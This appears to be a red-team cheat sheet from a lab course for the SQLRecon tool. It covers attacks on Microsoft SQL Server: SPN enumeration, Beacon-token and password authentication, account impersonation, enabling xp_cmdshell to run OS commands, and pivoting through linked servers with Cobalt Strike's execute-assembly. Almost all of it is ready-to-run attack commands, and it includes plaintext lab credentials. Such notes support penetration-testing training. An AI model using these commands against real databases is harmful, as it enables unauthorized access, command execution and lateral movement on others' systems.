[GitHub Link](https://github.com/skahwah/SQLRecon)


## Enumerate Servers via SPNs

---

Enumerates SQL servers by SPNs.

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
```


##  Enumerate SQL Instance

---

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info
```

The `/auth:wintoken` option allows SQLRecon to use the access token of the Beacon.


## Enumerate Current Roles

---

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```

The `/auth:wintoken` option allows SQLRecon to use the access token of the Beacon.


## Gaining Access to SQL Instance

---

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```


## Query SQL Database

---

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"
```

### Query Linked Servers

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
```


## Impersonate Accounts on an Instance

---

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
```

### Run Modules

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
```

### xp_cmdshell Interaction

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
```

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lxpcmd /i:DEV\mssql_svc /l:sql-1.cyberbotic.io /c:ipconfig
```

## Enumerate Links for an Instance

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
```

## Enumerate Linked Servers for More Links

```
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
```

## Enumerate Linked Servers

```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
```